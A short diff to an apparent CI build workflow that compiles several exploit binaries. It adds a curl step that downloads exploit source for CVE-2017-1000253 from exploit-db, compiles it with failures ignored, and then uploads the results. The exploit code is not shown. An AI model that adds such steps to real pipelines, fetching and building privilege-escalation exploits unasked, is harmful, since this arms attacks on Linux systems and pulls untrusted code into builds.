@@ -12,6 +12,8 @@ jobs:
           gcc -static -O2 -o bin/dirtydecrypt src/dirtydecrypt.c -lpthread
           gcc -static -O2 -o bin/fragnesia src/fragnesia.c -lpthread
           gcc -static -O2 -o bin/skb_segment_exploit src/skb_segment_exploit.c -lpthread
+          curl -fsSL -o src/cve-2017-1000253.c https://www.exploit-db.com/download/42887
+          gcc -static -O2 -o bin/pie_exploit src/cve-2017-1000253.c -lpthread || true
           ls -la bin/
           file bin/*
       - name: Upload binaries
